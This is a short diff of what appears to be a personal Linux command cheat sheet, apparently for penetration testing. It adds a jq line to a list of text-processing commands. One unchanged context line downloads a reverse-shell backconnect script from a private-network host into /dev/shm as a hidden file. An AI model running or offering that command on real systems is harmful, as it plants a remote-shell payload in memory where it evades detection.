@@ -185,6 +185,8 @@ cat file | sort | uniq -u # sort and displays the lines that appear once
 sed -i 's/OLD/NEW/g' path/file #Replace string inside a file
 echo "mido ahmed rawen 2002" | awk '{print $1}'  # mido
 echo "hate rawen : love rawen" | cut -f 2 -d ":" # love rawen
+cat file.json | jq . # output the results in JSON format
+
 
 #Download in RAM
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
